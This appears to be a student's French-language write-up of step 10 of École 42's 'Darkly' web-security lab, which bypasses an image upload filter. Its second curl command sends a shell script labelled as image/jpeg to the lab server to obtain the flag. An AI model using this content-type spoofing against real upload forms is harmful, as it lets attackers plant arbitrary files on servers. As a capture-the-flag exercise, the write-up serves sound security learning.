# Darkly - École 42

## 10. Upload image

- sur la page http://10.12.200.47/?page=upload

- F12 > Network

- uploader une image

- dans Network, on a une ligne `?page=upload`

- Clique dessus > Payload > form data > view source/paersed :

```
------WebKitFormBoundarybgZxwZUpl43L04OA
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundarybgZxwZUpl43L04OA
Content-Disposition: form-data; name="uploaded"; filename="10-tchoupi.jpg"
Content-Type: image/jpeg


------WebKitFormBoundarybgZxwZUpl43L04OA
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundarybgZxwZUpl43L04OA--
```

- DEPUIS LE DOSSIER RESSOURCES :

```
clear;
curl -X POST \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@./10-tchoupi.jpg;type=image/jpeg" \
  -F "Upload=Upload" \
  "http://10.12.200.47/?page=upload"

```

on obtient :

```
<section id="main" class="wrapper">
		<div class="container" style="margin-top:75px">
			<pre>/tmp/10-tchoupi.jpg succesfully uploaded.</pre>

```

on modifie la requete pour envoyer n'importe quel fichier

```

clear;
curl -X POST \
 -F "MAX_FILE_SIZE=100000" \
 -F "uploaded=@./10-script.sh;type=image/jpeg" \
 -F "Upload=Upload" \
 "http://10.12.200.47/?page=upload" | grep -i "flag"


```
